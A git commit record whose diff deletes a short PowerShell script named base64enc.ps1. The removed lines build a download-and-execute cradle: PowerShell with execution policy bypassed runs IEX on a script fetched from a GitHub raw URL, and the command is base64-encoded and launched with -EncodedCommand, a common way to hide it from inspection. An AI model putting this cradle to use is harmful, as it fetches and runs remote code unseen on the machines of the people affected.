6e164d36f071a3036595f17982b51a30d462944d
imjustgunnamakethisthing <49309038+imjustgunnamakethisthing@users.noreply.github.com>
2020-12-18 16:23:09 +0000

    Delete base64enc.ps1

--- base64enc.ps1
+++
@@ -1,3 +0,0 @@
-$cmd = "powershell -nop -exec bypass -c `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/imjustgunnamakethisthing/test/master/helloworld.ps1');`""
-$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
-powershell -EncodedCommand  $encodedCmd
